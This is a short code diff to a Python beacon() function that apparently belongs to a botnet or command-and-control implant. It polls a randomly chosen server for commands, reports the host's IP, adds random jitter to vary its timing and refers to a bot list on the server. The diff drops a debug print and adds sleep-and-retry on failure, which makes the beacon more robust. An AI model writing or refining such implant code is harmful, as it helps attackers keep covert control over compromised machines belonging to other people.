@@ -58,7 +58,6 @@ def beacon():
 		cmds = {}
 		ip = getIP()
 		arkIP = random.choice(ips)
-		print(arkIP)
 		#random offset to vary beacon timing
 		offset = random.randrange(-10,10)
 
@@ -66,7 +65,8 @@ def beacon():
 		try:
 			commands = requests.get('http://{}/beacon?ip={}'.format(arkIP, ip))
 		except:
-			pass
+			time.sleep(30 + offset)
+			continue
 		
 
 		#catch error for bot not being in botlist on server
